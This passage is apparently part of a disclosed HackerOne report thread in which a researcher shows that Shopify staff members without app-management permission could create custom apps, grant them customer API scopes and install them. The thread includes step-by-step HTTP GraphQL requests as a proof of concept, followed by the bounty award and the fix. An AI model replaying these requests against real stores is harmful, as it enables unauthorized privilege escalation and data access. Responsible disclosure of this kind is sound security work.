      "message": "I forgot to mention in the impact description that also the **confidentiality** could be affected…an attacker could for example extend the Admin API scope for an existing custom app and the developers of that custom app now get additional access to orders (scope: `read_all_orders`) or customers (scope: `read_all_customers`), etc.\n\nI think there are multiple scenarios how an attacker can exploit this vulnerability and affect the confidentiality, integrity or availability.\n\nKind regards \n@kun_19\n\n\n\n",
      "automated_response": false,
      "created_at": "2022-05-01T20:25:02.947Z",
      "updated_at": "2022-05-01T20:25:02.947Z",
      "actor": {
        "username": "kun_19",
        "cleared": false,
        "verified": false,
        "url": "/kun_19",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/M8SJ4S6QmGRoPZP9fGQYupea/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 16524880,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @kun_19 !\n\nThanks for your report! I haven't been able to change a private app's API scopes or install it by following similar steps to those you included. Were you able to perform these actions and can you provide a POC for them?\n",
      "automated_response": false,
      "created_at": "2022-05-02T18:31:57.852Z",
      "updated_at": "2022-05-02T18:31:57.852Z",
      "actor": {
        "username": "dairy_shopify",
        "cleared": false,
        "verified": false,
        "url": "/dairy_shopify",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/mikl4cqsibmx73yr716bwet06r0j/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 16524910,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "",
      "automated_response": false,
      "created_at": "2022-05-02T18:35:26.066Z",
      "updated_at": "2022-05-02T18:35:26.066Z",
      "actor": {
        "username": "dairy_shopify",
        "cleared": false,
        "verified": false,
        "url": "/dairy_shopify",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/mikl4cqsibmx73yr716bwet06r0j/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 16525465,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "Hi @danny_shopify,\n\nbut I guess you were you able to create a custom app as a staff member as described in the \"Steps to Reproduce\", right?\n\nTo change a private app's Admin API scope the staff member / attacker also needs the relevant permissions for the respective store resource. Thus, the staff member can for example only change the customer related Admin API scopes `read_customers` and `write_customers`, if he has `Customers` permission:\n\n### PoC Change Admin API scope + install app\n\n1. Make sure that the staff member has the permissions as following:  \n{F1714607}\n\n2. The staff member has now the possibility to add the Admin API scope `read_customers` and `write_customers` for **any** custom app. To create a new custom app send following request to the server (replace the placeholders `<YOUR_STORE>`, `<CSRF_COOKIES_STAFF_MEMBER>`, `<CSRF_TOKEN_STAFF_MEMBER>` and `<STAFF_MEMBER_ID>` with the appropriate values):  \n```\nPOST /admin/internal/web/graphql/core?operation=CreateAppMutation&type=mutation HTTP/2\nHost: <YOUR_STORE>.myshopify.com\nCookie: <COOKIES_STAFF_MEMBER>\nContent-Length: 444\nSec-Ch-Ua: \"Chromium\";v=\"93\", \" Not;A Brand\";v=\"99\"\nX-Csrf-Token: <CSRF_TOKEN_STAFF_MEMBER>\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36\nContent-Type: application/json\nAccept: application/json\nX-Shopify-Web-Force-Proxy: 1\nSec-Ch-Ua-Platform: \"Linux\"\nOrigin: https://<YOUR_STORE>.myshopify.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\n{\n   \"operationName\":\"CreateAppMutation\",\n   \"variables\":{\n      \"input\":{\n         \"title\":\"PoC add Admin API scope + install\",\n         \"maintainerUserId\":\"gid://shopify/StaffMember/<STAFF_MEMBER_ID>\"\n      }\n   },\n   \"query\":\"mutation CreateAppMutation($input: ShopOwnedAppCreateInput!) {\\n  shopOwnedAppCreate(input: $input) {\\n    app {\\n      id\\n      title\\n      __typename\\n    }\\n    userErrors {\\n      field\\n      message\\n      code\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"\n}\n```\n3. The server should have responded with a successful message and with the created custom app ID (`6864613` in this case, but use your App ID in step 4):  \n```\n{\n   \"data\":{\n      \"shopOwnedAppCreate\":{\n         \"app\":{\n            \"id\":\"gid:\\/\\/shopify\\/App\\/6864613\",\n            \"title\":\"PoC add Admin API scope + install\",\n            \"__typename\":\"App\"\n         },\n         \"userErrors\":[\n            \n         ],\n         \"__typename\":\"ShopOwnedAppCreatePayload\"\n      }\n   },\n   ...\n}\n``` \n4. As the custom app is now created, the Admin API scopes `read_customers` and `write_customers` can be added with following request (replace the placeholders `<YOUR_STORE>`, `<CSRF_COOKIES_STAFF_MEMBER>`, `<CSRF_TOKEN_STAFF_MEMBER>` and `<CUSTOM_APP_ID>` with the appropriate values):  \n```\nPOST /admin/internal/web/graphql/core?operation=UpdateAdminApiIntegration&type=mutation HTTP/2\nHost: <YOUR_STORE>.myshopify.com\nCookie: <COOKIES_STAFF_MEMBER>\nContent-Length: 863\nSec-Ch-Ua: \"Chromium\";v=\"93\", \" Not;A Brand\";v=\"99\"\nX-Csrf-Token: <CSRF_TOKEN_STAFF_MEMBER>\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36\nContent-Type: application/json\nAccept: application/json\nX-Shopify-Web-Force-Proxy: 1\nSec-Ch-Ua-Platform: \"Linux\"\nOrigin: https://<YOUR_STORE>.myshopify.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\n{\n   \"operationName\":\"UpdateAdminApiIntegration\",\n   \"variables\":{\n      \"appId\":\"gid://shopify/App/<CUSTOM_APP_ID>\",\n      \"grant\":false,\n      \"webhookApiVersion\":\"2022-04\",\n      \"scopes\":[\n         \"write_customers\",\n         \"read_customers\"\n      ],\n      \"eventBridgeCreate\":null,\n      \"eventBridgeDelete\":null\n   },\n   \"query\":\"mutation UpdateAdminApiIntegration($appId: ID!, $grant: Boolean!, $scopes: [String!], $webhookApiVersion: String, $eventBridgeCreate: [ShopOwnedAppUpdateEventBridgeSourceInput!], $eventBridgeDelete: [ID!]) {\\n  shopOwnedAppUpdate(\\n    appId: $appId\\n    grant: $grant\\n    webhookApiVersion: $webhookApiVersion\\n    authenticatedAccessScopes: $scopes\\n    eventBridgeSourcesToCreate: $eventBridgeCreate\\n    eventBridgeSourcesToDelete: $eventBridgeDelete\\n  ) {\\n    app {\\n      id\\n      __typename\\n    }\\n    userErrors {\\n      field\\n      message\\n      code\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"\n}\n```\n\n5. The custom app should now have the Admin API scopes `read_customers` and `write_customers` and can be installed with following request (replace the placeholders `<YOUR_STORE>`, `<CSRF_COOKIES_STAFF_MEMBER>`, `<CSRF_TOKEN_STAFF_MEMBER>` and `<CUSTOM_APP_ID>` with the appropriate values):  \n```\nPOST /admin/internal/web/graphql/core?operation=InstallCustomApp&type=mutation HTTP/2\nHost: <YOUR_STORE>.myshopify.com\nCookie: <COOKIES_STAFF_MEMBER>\nContent-Length: 344\nSec-Ch-Ua: \"Chromium\";v=\"93\", \" Not;A Brand\";v=\"99\"\nX-Csrf-Token: <CSRF_TOKEN_STAFF_MEMBER>\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36\nContent-Type: application/json\nAccept: application/json\nX-Shopify-Web-Force-Proxy: 1\nSec-Ch-Ua-Platform: \"Linux\"\nOrigin: https://<YOUR_STORE>.myshopify.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\n{\n   \"operationName\":\"InstallCustomApp\",\n   \"variables\":{\n      \"appId\":\"gid://shopify/App/<CUSTOM_APP_ID>\"\n   },\n   \"query\":\"mutation InstallCustomApp($appId: ID!) {\\n  shopOwnedAppUpdate(appId: $appId, grant: true) {\\n    app {\\n      id\\n      __typename\\n    }\\n    userErrors {\\n      field\\n      message\\n      code\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"\n}\n```\n\n6. The custom app should now be successfully installed with the mentioned Admin API scopes:  \n{F1714622}\n\nI hope this is enough so that you can create your own custom app, set an Admin API scope and install the app as unauthorized staff member. So I think the missing piece was to grant the staff member the relevant permissions for the respective store resource.\n\nBut anyways, a staff member should not be able to create, edit and install custom apps if the permission `Manage and install apps and channels` is **not** granted.\nIf you have any further questions (also regarding the impact of this bug), feel free to ask ;)\n\nKind regards\n@kun_19 ",
      "automated_response": false,
      "created_at": "2022-05-02T19:35:17.096Z",
      "updated_at": "2022-05-02T19:37:23.549Z",
      "actor": {
        "username": "kun_19",
        "cleared": false,
        "verified": false,
        "url": "/kun_19",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/M8SJ4S6QmGRoPZP9fGQYupea/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1714622,
          "filename": "installed_custom_app.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/u2xwyv3dl3n0j46txxzzvudd0o6m?response-content-disposition=attachment%3B%20filename%3D%22installed_custom_app.png%22%3B%20filename%2A%3DUTF-8%27%27installed_custom_app.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070143Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0e489e59a9e31a7f6c4831436d782f0f518c084d9e678e643d77523a3d2ef51e"
        },
        {
          "id": 1714607,
          "filename": "permissions_specific_app_customer_scope.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/k32456aduoexokqxo8p7tqyj1mkl?response-content-disposition=attachment%3B%20filename%3D%22permissions_specific_app_customer_scope.png%22%3B%20filename%2A%3DUTF-8%27%27permissions_specific_app_customer_scope.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070143Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7f4dabb8e6e56b32bc5e07fa75172a1bcf7cb5f3d0a304dbae16f4554de6dac1"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 16536056,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks for the detailed follow up! We are currently investigating and will get back to you once we have an update to share.",
      "automated_response": false,
      "created_at": "2022-05-03T13:10:24.865Z",
      "updated_at": "2022-05-03T13:10:24.865Z",
      "actor": {
        "username": "dairy_shopify",
        "cleared": false,
        "verified": false,
        "url": "/dairy_shopify",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/mikl4cqsibmx73yr716bwet06r0j/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 16564598,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @kun_19,\n\nThank you for your report! We were able to reproduce the issue and our engineering team is working on a fix. We will get back to you regarding a bounty eligibility decision.",
      "automated_response": false,
      "created_at": "2022-05-04T19:47:08.966Z",
      "updated_at": "2022-05-04T19:47:08.966Z",
      "actor": {
        "username": "dairy_shopify",
        "cleared": false,
        "verified": false,
        "url": "/dairy_shopify",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/mikl4cqsibmx73yr716bwet06r0j/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 16624972,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "",
      "automated_response": false,
      "created_at": "2022-05-09T20:10:22.133Z",
      "updated_at": "2022-05-09T20:10:22.133Z",
      "actor": {
        "username": "zack_spotify",
        "cleared": false,
        "verified": false,
        "url": "/zack_spotify",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/261/793/78a81f701248b9e632d5de7b037e5e0eedd37560_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 16744421,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @danny_shopify,\n\nI‘m just curious about the status of this finding. As I’m quite new to the shopify bbp, what‘s the exact process for the bounty decision? Will the bug be fixed BEFORE a bounty is paid? Or is the bounty decision independent from the bug fixing? Just wondering why the bounty decision takes multiple days.\n\nKind Regards,\n@kun_19 ",
      "automated_response": false,
      "created_at": "2022-05-17T18:10:29.270Z",
      "updated_at": "2022-05-17T18:10:29.270Z",
      "actor": {
        "username": "kun_19",
        "cleared": false,
        "verified": false,
        "url": "/kun_19",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/M8SJ4S6QmGRoPZP9fGQYupea/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 16745157,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks for the followup.\n\nWe're still working on determining the full CVSS impact of this issue. Once determined we pay the corresponding bounty. We should have an update for you soon. ",
      "automated_response": false,
      "created_at": "2022-05-17T18:26:44.090Z",
      "updated_at": "2022-05-17T18:26:44.090Z",
      "actor": {
        "username": "zack_spotify",
        "cleared": false,
        "verified": false,
        "url": "/zack_spotify",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/261/793/78a81f701248b9e632d5de7b037e5e0eedd37560_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 16745360,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Alright! Thank you for your quick response!",
      "automated_response": false,
      "created_at": "2022-05-17T18:56:46.950Z",
      "updated_at": "2022-05-17T18:56:46.950Z",
      "actor": {
        "username": "kun_19",
        "cleared": false,
        "verified": false,
        "url": "/kun_19",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/M8SJ4S6QmGRoPZP9fGQYupea/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 16765429,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Of course! Sorry for the delay, we usually aim to have an answer within 7 days of triage.",
      "automated_response": false,
      "created_at": "2022-05-18T13:49:41.563Z",
      "updated_at": "2022-05-18T13:49:41.563Z",
      "actor": {
        "username": "zack_spotify",
        "cleared": false,
        "verified": false,
        "url": "/zack_spotify",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/261/793/78a81f701248b9e632d5de7b037e5e0eedd37560_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 16780438,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "Thanks again for your report!\n\nWe’re awarding a $1,900 bounty for this issue.\n\nThis resulted in a Low Integrity impact, allowing a staff member to interact with a mutation they do not have authorization for.\n\nPlease find below our rationale generated using our [CVSS calculator](https://shopify.github.io/appsec/cvss_calculator/).\n\n# Base Score CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N 4.3\n# Environment: Core\n\n### Attack Complexity: L\n* Specific conditions or measurable effort to exploit?: No\n\n### Privileges Required: L\n* Requires privileged account (not self-registered)?: Yes\n* Does the attacker need extensive permissions?: No\n\n### User Interaction: N\n* Requires victim to perform some action during exploit?: No\n\n### Scope: U\n* Can the attacker impact a separate service?: No\n\n### Confidentiality: N\n* How much data could be accessed?: None\n\n### Integrity: L\n* How much data could be changed?: Some\n* How much of Shopify is impacted?: Some\n\n### Availability: N\n* Level of disruption to network service?: None\n",
      "automated_response": false,
      "created_at": "2022-05-19T14:03:20.249Z",
      "updated_at": "2022-05-19T14:03:20.249Z",
      "actor": {
        "url": "/shopify",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "profile": {
          "name": "Shopify"
        }
      },
      "bounty_amount": "1900.0",
      "bonus_amount": "0.0",
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "shopify",
      "collaborator": {
        "username": "kun_19",
        "url": "/kun_19"
      }
    },
    {
      "id": 16782727,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thank you for the bounty!",
      "automated_response": false,
      "created_at": "2022-05-19T17:58:17.513Z",
      "updated_at": "2022-05-19T17:58:17.513Z",
      "actor": {
        "username": "kun_19",
        "cleared": false,
        "verified": false,
        "url": "/kun_19",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/M8SJ4S6QmGRoPZP9fGQYupea/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 17261972,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Thanks again for your report. Our engineering team has deployed a fix for this so the issue should no longer be reproducible. If you are able to bypass the fix, please let us know.\n\nThanks for helping make Shopify more secure. We hope you'll continue to do so.\n\nHappy Hacking!",
      "automated_response": false,
      "created_at": "2022-06-23T18:49:04.665Z",
      "updated_at": "2022-06-23T18:49:04.665Z",
      "actor": {
        "username": "carol-shopify",
        "cleared": false,
        "verified": false,
        "url": "/carol-shopify",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/fpi9d0c4ntiulnzcwid0v8begj5r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "kun_19",
        "url": "/kun_19"
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 17514332,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-07-11T17:23:43.838Z",
      "updated_at": "2022-07-11T17:23:43.838Z",
      "first_to_agree": true,
      "actor": {
        "username": "abdulwahaab_ahmed",
        "cleared": false,
        "verified": false,
        "url": "/abdulwahaab_ahmed",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/166/726/fa53e0dd37718653edc8e2abea4724f3d0af03e9_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 17514598,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-07-11T17:50:35.698Z",
      "updated_at": "2022-07-11T17:50:35.698Z",
      "actor": {
        "username": "kun_19",
        "cleared": false,
        "verified": false,
        "url": "/kun_19",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/M8SJ4S6QmGRoPZP9fGQYupea/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    },
    {
      "id": 17514599,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-07-11T17:50:35.796Z",
      "updated_at": "2022-07-11T17:50:35.796Z",
      "actor": {
        "username": "kun_19",
        "cleared": false,
        "verified": false,
        "url": "/kun_19",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/M8SJ4S6QmGRoPZP9fGQYupea/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "shopify"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}